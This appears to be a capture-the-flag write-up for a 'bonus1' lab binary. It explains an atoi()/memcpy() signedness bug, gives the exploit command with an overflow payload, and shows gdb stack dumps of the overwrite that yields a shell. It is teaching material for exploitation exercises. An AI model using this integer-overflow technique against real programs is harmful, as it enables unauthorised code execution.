##  Description

This level requires the user to input two arguments. The first one is run through `atoi()` and if the result is greater than 9, the program returns. 

The program then calls `memcpy()` to write n bytes of av[2] into a 36 bytes buffer; it might be tempting to overflow the buffer to overwrite the return address, but that won't work. Instead, we can overwrite the integer nbr to pass the check.

But how can we copy more than 9 bytes into the buffer if nbr cannot be greater than 9? The trick here is very elegant: atoi() returns an int, but memcpy() takes a size_t as a parameter. Knowing this, we can use INT_MIN as av[2] so that it will get us passed the check while still copying enough bytes with memcpy(), like so:

```
./bonus1 -2147483637 $(python -c "print('A'*40 + '\x46\x4c\x4f\x57')")
                                                   ^ F ^ L ^ O ^ W
```

This is the state of the stack before the call to atoi():

```bash
Breakpoint 2, 0xb7e5d250 in atoi () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/32wx $esp
0xbffff5bc:     0x0804843d      0xbffff7fd      0x08049764      0x00000003
0xbffff5cc:     0x080482fd      0xb7fd13e4      0x00000016      0x08049764
0xbffff5dc:     0x080484d1      0xffffffff      0xb7e5edc6      0xb7fd0ff4
0xbffff5ec:     0xb7e5ee55      0xb7fed280      0x00000000      0x080484b9
0xbffff5fc:     0xb7fd0ff4      0x080484b0      0x00000000      0x00000000
0xbffff60c:     0xb7e454d3      0x00000003      0xbffff6a4      0xbffff6b4
0xbffff61c:     0xb7fdc858      0x00000000      0xbffff61c      0xbffff6b4
0xbffff62c:     0x00000000      0x0804821c      0xb7fd0ff4      0x00000000
(gdb) continue
Continuing.
```

Here we can see where the resulting nbr from atoi() is saved on the stack, we need to overwrite the buffer and insert the value required to pass the check.
Note that -2147483637 in decimal gives 0x8000000b in hexadecimal, which is enough to copy the 40 bytes of padding and the 4 bytes required to pass the check, as we can see here before the call to memcpy():

```bash
Breakpoint 3, 0xb7f65170 in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/32wx $esp
0xbffff5bc:     0x08048478      0xbffff5d4      0xbffff809      0x0000002c
0xbffff5cc:     0x080482fd      0xb7fd13e4      0x00000016      0x08049764
0xbffff5dc:     0x080484d1      0xffffffff      0xb7e5edc6      0xb7fd0ff4
0xbffff5ec:     0xb7e5ee55      0xb7fed280      0x00000000      0x080484b9
0xbffff5fc:     0x8000000b <<   0x080484b0      0x00000000      0x00000000
0xbffff60c:     0xb7e454d3      0x00000003      0xbffff6a4      0xbffff6b4
0xbffff61c:     0xb7fdc858      0x00000000      0xbffff61c      0xbffff6b4
0xbffff62c:     0x00000000      0x0804821c      0xb7fd0ff4      0x00000000
(gdb) continue
Continuing.
```

After the memcpy(), we can see that the buffer has been copied successfully:

```bash
Breakpoint 4, 0xb7ee4500 in execl () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/32wx $esp
0xbffff5bc:     0x0804849e      0x08048583      0x08048580      0x00000000
0xbffff5cc:     0x080482fd      0xb7fd13e4      0x41414141      0x41414141
0xbffff5dc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff5ec:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff5fc:     0x574f4c46 <<   0x080484b0      0x00000000      0x00000000
0xbffff60c:     0xb7e454d3      0x00000003      0xbffff6a4      0xbffff6b4
0xbffff61c:     0xb7fdc858      0x00000000      0xbffff61c      0xbffff6b4
0xbffff62c:     0x00000000      0x0804821c      0xb7fd0ff4      0x00000000
```

We have successfully overwritten the number with the matching value for the check, popping a shell!
